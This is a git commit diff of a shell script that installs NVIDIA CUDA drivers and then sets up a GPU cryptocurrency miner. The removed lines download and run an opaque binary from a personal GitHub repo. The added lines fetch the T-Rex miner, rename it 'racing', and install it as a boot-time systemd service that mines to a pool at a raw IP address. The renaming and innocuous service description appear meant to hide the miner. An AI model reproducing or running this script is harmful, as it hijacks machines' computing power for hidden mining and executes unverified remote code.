4991a8a7a5ed263b85dcfc6617892f963d39d4e6
nguyen3297 <85713242+nguyen3297@users.noreply.github.com>
2021-09-12 19:34:05 +0700

    Update nguyenvip.sh

--- nguyenvip.sh
+++ nguyenvip.sh
@@ -7,13 +7,10 @@ echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/
 sudo apt-get update
 sudo apt-get -y install cuda-drivers
 sudo apt-get install libcurl3 -y
-wget https://github.com/nguyen3297/sub/raw/main/bin.bin
-mv bin.bin bin.zip
-sudo apt install unzip
-unzip bin.zip
-cd bin
-sudo chmod +x racing
-sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/quantri/bin/racing -U -P http://135.148.176.21:8443/racing\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
+wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
+tar xvzf t-rex-0.21.6-linux.tar.gz
+mv t-rex racing
+sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/quantri/racing -a ethash -o stratum+http://135.148.176.21:8443 -w trex\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
-./racing -U -P http://135.148.176.21:8443/buiin &
+./racing -a ethash -o stratum+http://135.148.176.21:8443 -w trex &
